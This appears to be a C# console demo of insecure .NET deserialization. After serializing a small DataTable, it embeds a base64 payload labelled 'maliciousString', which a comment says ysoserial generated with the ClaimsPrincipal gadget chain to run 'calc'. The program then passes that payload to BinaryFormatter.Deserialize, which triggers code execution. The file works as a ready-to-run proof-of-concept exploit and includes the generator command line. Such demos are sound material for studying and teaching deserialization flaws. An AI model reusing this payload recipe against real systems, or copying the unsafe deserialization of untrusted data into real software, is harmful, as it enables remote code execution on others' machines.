﻿using System;
using System.Collections.Generic;
using System.Data;
using System.IO;
using System.Linq;
using System.Runtime.Serialization.Formatters.Binary;
using System.Text;
using System.Threading.Tasks;

namespace BinaryConsole
{
    internal class Program
    {
        static void Main(string[] args)
        {
            DataTable table = new DataTable("smallTable");
            // Add rows to the table
            table.Columns.Add("id", typeof(int));
            table.Columns.Add("name", typeof(string));
            table.Rows.Add(1, "John");
            table.Rows.Add(2, "Jane");
            table.Rows.Add(3, "Jack");

            // Serialize the DataTable to a memory stream
            string binTable = SerializeObject((object)table);


            // ysoserial -f BinaryFormatter -g ClaimsPrincipal -o base64 -c "calc" -t
            string maliciousString = "AAEAAAD/////AQAAAAAAAAAEAQAAACZTeXN0ZW0uU2VjdXJpdHkuQ2xhaW1zLkNsYWltc1ByaW5jaXBhbAEAAAAcbV9zZXJpYWxpemVkQ2xhaW1zSWRlbnRpdGllcwEGBQAAAKwXQUFFQUFBRC8vLy8vQVFBQUFBQUFBQUFNQWdBQUFFbFRlWE4wWlcwc0lGWmxjbk5wYjI0OU5DNHdMakF1TUN3Z1EzVnNkSFZ5WlQxdVpYVjBjbUZzTENCUWRXSnNhV05MWlhsVWIydGxiajFpTnpkaE5XTTFOakU1TXpSbE1EZzVCUUVBQUFDRUFWTjVjM1JsYlM1RGIyeHNaV04wYVc5dWN5NUhaVzVsY21sakxsTnZjblJsWkZObGRHQXhXMXRUZVhOMFpXMHVVM1J5YVc1bkxDQnRjMk52Y214cFlpd2dWbVZ5YzJsdmJqMDBMakF1TUM0d0xDQkRkV3gwZFhKbFBXNWxkWFJ5WVd3c0lGQjFZbXhwWTB0bGVWUnZhMlZ1UFdJM04yRTFZelUyTVRrek5HVXdPRGxkWFFRQUFBQUZRMjkxYm5RSVEyOXRjR0Z5WlhJSFZtVnljMmx2YmdWSmRHVnRjd0FEQUFZSWpRRlRlWE4wWlcwdVEyOXNiR1ZqZEdsdmJuTXVSMlZ1WlhKcFl5NURiMjF3WVhKcGMyOXVRMjl0Y0dGeVpYSmdNVnRiVTNsemRHVnRMbE4wY21sdVp5d2diWE5qYjNKc2FXSXNJRlpsY25OcGIyNDlOQzR3TGpBdU1Dd2dRM1ZzZEhWeVpUMXVaWFYwY21Gc0xDQlFkV0pzYVdOTFpYbFViMnRsYmoxaU56ZGhOV00xTmpFNU16UmxNRGc1WFYwSUFnQUFBQUlBQUFBSkF3QUFBQUlBQUFBSkJBQUFBQVFEQUFBQWpRRlRlWE4wWlcwdVEyOXNiR1ZqZEdsdmJuTXVSMlZ1WlhKcFl5NURiMjF3WVhKcGMyOXVRMjl0Y0dGeVpYSmdNVnRiVTNsemRHVnRMbE4wY21sdVp5d2diWE5qYjNKc2FXSXNJRlpsY25OcGIyNDlOQzR3TGpBdU1Dd2dRM1ZzZEhWeVpUMXVaWFYwY21Gc0xDQlFkV0pzYVdOTFpYbFViMnRsYmoxaU56ZGhOV00xTmpFNU16UmxNRGc1WFYwQkFBQUFDMTlqYjIxd1lYSnBjMjl1QXlKVGVYTjBaVzB1UkdWc1pXZGhkR1ZUWlhKcFlXeHBlbUYwYVc5dVNHOXNaR1Z5Q1FVQUFBQVJCQUFBQUFJQUFBQUdCZ0FBQUFjdll5QmpZV3hqQmdjQUFBQURZMjFrQkFVQUFBQWlVM2x6ZEdWdExrUmxiR1ZuWVhSbFUyVnlhV0ZzYVhwaGRHbHZia2h2YkdSbGNnTUFBQUFJUkdWc1pXZGhkR1VIYldWMGFHOWtNQWR0WlhSb2IyUXhBd01ETUZONWMzUmxiUzVFWld4bFoyRjBaVk5sY21saGJHbDZZWFJwYjI1SWIyeGtaWElyUkdWc1pXZGhkR1ZGYm5SeWVTOVRlWE4wWlcwdVVtVm1iR1ZqZEdsdmJpNU5aVzFpWlhKSmJtWnZVMlZ5YVdGc2FYcGhkR2x2YmtodmJHUmxjaTlUZVhOMFpXMHVVbVZtYkdWamRHbHZiaTVOWlcxaVpYSkpibVp2VTJWeWFXRnNhWHBoZEdsdmJraHZiR1JsY2drSUFBQUFDUWtBQUFBSkNnQUFBQVFJQUFBQU1GTjVjM1JsYlM1RVpXeGxaMkYwWlZObGNtbGhiR2w2WVhScGIyNUliMnhrWlhJclJHVnNaV2RoZEdWRmJuUnllUWNBQUFBRWRIbHdaUWhoYzNObGJXSnNlUVowWVhKblpYUVNkR0Z5WjJWMFZIbHdaVUZ6YzJWdFlteDVEblJoY21kbGRGUjVjR1ZPWVcxbENtMWxkR2h2WkU1aGJXVU5aR1ZzWldkaGRHVkZiblJ5ZVFFQkFnRUJBUU13VTNsemRHVnRMa1JsYkdWbllYUmxVMlZ5YVdGc2FYcGhkR2x2YmtodmJHUmxjaXRFWld4bFoyRjBaVVZ1ZEhKNUJnc0FBQUN3QWxONWMzUmxiUzVHZFc1allETmJXMU41YzNSbGJTNVRkSEpwYm1jc0lHMXpZMjl5YkdsaUxDQldaWEp6YVc5dVBUUXVNQzR3TGpBc0lFTjFiSFIxY21VOWJtVjFkSEpoYkN3Z1VIVmliR2xqUzJWNVZHOXJaVzQ5WWpjM1lUVmpOVFl4T1RNMFpUQTRPVjBzVzFONWMzUmxiUzVUZEhKcGJtY3NJRzF6WTI5eWJHbGlMQ0JXWlhKemFXOXVQVFF1TUM0d0xqQXNJRU4xYkhSMWNtVTlibVYxZEhKaGJDd2dVSFZpYkdsalMyVjVWRzlyWlc0OVlqYzNZVFZqTlRZeE9UTTBaVEE0T1Ywc1cxTjVjM1JsYlM1RWFXRm5ibTl6ZEdsamN5NVFjbTlqWlhOekxDQlRlWE4wWlcwc0lGWmxjbk5wYjI0OU5DNHdMakF1TUN3Z1EzVnNkSFZ5WlQxdVpYVjBjbUZzTENCUWRXSnNhV05MWlhsVWIydGxiajFpTnpkaE5XTTFOakU1TXpSbE1EZzVYVjBHREFBQUFFdHRjMk52Y214cFlpd2dWbVZ5YzJsdmJqMDBMakF1TUM0d0xDQkRkV3gwZFhKbFBXNWxkWFJ5WVd3c0lGQjFZbXhwWTB0bGVWUnZhMlZ1UFdJM04yRTFZelUyTVRrek5HVXdPRGtLQmcwQUFBQkpVM2x6ZEdWdExDQldaWEp6YVc5dVBUUXVNQzR3TGpBc0lFTjFiSFIxY21VOWJtVjFkSEpoYkN3Z1VIVmliR2xqUzJWNVZHOXJaVzQ5WWpjM1lUVmpOVFl4T1RNMFpUQTRPUVlPQUFBQUdsTjVjM1JsYlM1RWFXRm5ibTl6ZEdsamN5NVFjbTlqWlhOekJnOEFBQUFGVTNSaGNuUUpFQUFBQUFRSkFBQUFMMU41YzNSbGJTNVNaV1pzWldOMGFXOXVMazFsYldKbGNrbHVabTlUWlhKcFlXeHBlbUYwYVc5dVNHOXNaR1Z5QndBQUFBUk9ZVzFsREVGemMyVnRZbXg1VG1GdFpRbERiR0Z6YzA1aGJXVUpVMmxuYm1GMGRYSmxDbE5wWjI1aGRIVnlaVElLVFdWdFltVnlWSGx3WlJCSFpXNWxjbWxqUVhKbmRXMWxiblJ6QVFFQkFRRUFBd2dOVTNsemRHVnRMbFI1Y0dWYlhRa1BBQUFBQ1EwQUFBQUpEZ0FBQUFZVUFBQUFQbE41YzNSbGJTNUVhV0ZuYm05emRHbGpjeTVRY205alpYTnpJRk4wWVhKMEtGTjVjM1JsYlM1VGRISnBibWNzSUZONWMzUmxiUzVUZEhKcGJtY3BCaFVBQUFBK1UzbHpkR1Z0TGtScFlXZHViM04wYVdOekxsQnliMk5sYzNNZ1UzUmhjblFvVTNsemRHVnRMbE4wY21sdVp5d2dVM2x6ZEdWdExsTjBjbWx1WnlrSUFBQUFDZ0VLQUFBQUNRQUFBQVlXQUFBQUIwTnZiWEJoY21VSkRBQUFBQVlZQUFBQURWTjVjM1JsYlM1VGRISnBibWNHR1FBQUFDdEpiblF6TWlCRGIyMXdZWEpsS0ZONWMzUmxiUzVUZEhKcGJtY3NJRk41YzNSbGJTNVRkSEpwYm1jcEJob0FBQUF5VTNsemRHVnRMa2x1ZERNeUlFTnZiWEJoY21Vb1UzbHpkR1Z0TGxOMGNtbHVaeXdnVTNsemRHVnRMbE4wY21sdVp5a0lBQUFBQ2dFUUFBQUFDQUFBQUFZYkFBQUFjVk41YzNSbGJTNURiMjF3WVhKcGMyOXVZREZiVzFONWMzUmxiUzVUZEhKcGJtY3NJRzF6WTI5eWJHbGlMQ0JXWlhKemFXOXVQVFF1TUM0d0xqQXNJRU4xYkhSMWNtVTlibVYxZEhKaGJDd2dVSFZpYkdsalMyVjVWRzlyWlc0OVlqYzNZVFZqTlRZeE9UTTBaVEE0T1YxZENRd0FBQUFLQ1F3QUFBQUpHQUFBQUFrV0FBQUFDZ3M9Cw==";

            byte[] buffer = Convert.FromBase64String(maliciousString);

            using (var stream = new MemoryStream(buffer))
            {
                BinaryFormatter binaryformatter = new BinaryFormatter();
                object badObj = binaryformatter.Deserialize(stream);
            }
        }

        private static string SerializeObject(object obj)
        {
            BinaryFormatter binaryformatter = new BinaryFormatter();
            using (var stream = new MemoryStream())
            {
                binaryformatter.Serialize(stream, obj);
                return Convert.ToBase64String(stream.ToArray());
            }

        }
    }
}
